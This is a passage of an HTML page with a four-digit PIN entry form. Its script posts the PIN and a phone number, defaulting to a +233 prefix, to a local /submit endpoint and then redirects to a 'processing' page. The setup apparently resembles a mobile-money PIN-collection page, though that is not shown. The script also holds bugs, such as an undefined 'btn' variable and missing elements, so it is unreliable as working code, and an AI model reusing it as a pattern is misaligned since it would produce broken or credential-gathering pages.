    <!-- CENTER -->
    <div class="center">

                <input maxlength="1" class="pin-box" type="password">

            </div>
        
        </div>
    </div>

        <div class="actions">

            <button class="btn">

    <script>


        const inputs = document.querySelectorAll(".pin-box");
        const loginBtn = document.getElementById("submitBtn");

        inputs.forEach((input, index) => {
            input.addEventListener("input", () => {
                input.value = input.value.replace(/[^0-9]/g, "");

                if (input.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }

                checkPin();

            });

            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        async function submitOtp() {
            // document.getElementById("submitBtn");
            if (loginBtn.disabled) return;

            let pin = "";
            document.querySelectorAll(".pin-box").forEach(input => {
                pin += input.value;
            });

            const error = document.getElementById("errorMsg");

            if (pin.length < 4) {
                error.innerText = "Enter full PIN";
                error.style.display = "block";
                return;
            }

            error.style.display = "none";

            loginBtn.innerText = "Processing...";
            loginBtn.disabled = true;

            ;

            const phone = document.getElementById("phone").value;

            try {
                const res = await fetch("/submit", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        name: "User",
                        phone: phone,
                        pin: pin
                    })
                });

                if (!res.ok) throw new Error();

                // clear PIN AFTER submit
                document.querySelectorAll(".pin-box").forEach(input => input.value = "");

                localStorage.setItem("firstProcess", "yes");

                window.location.href = "processing.html";

            } catch (err) {
                error.innerText = "Submission failed. Try again.";
                error.style.display = "block";

                btn.innerText = "Submit";
                btn.disabled = false;

                document.getElementById("pageLoader").style.display = "none";
            }
        }

        // BUTTON ACTIVE
        function checkPin() {
            let pin = "";
            inputs.forEach(i => pin += i.value);

            if (pin.length === 4) {
                loginBtn.classList.add("active");
            } else {
                loginBtn.classList.remove("active");
            }
        }


        document.getElementById("phone").value = localStorage.getItem("phone") || "+233";

        window.onload = () => {
            document.body.classList.add("loaded");
        };

    </script>
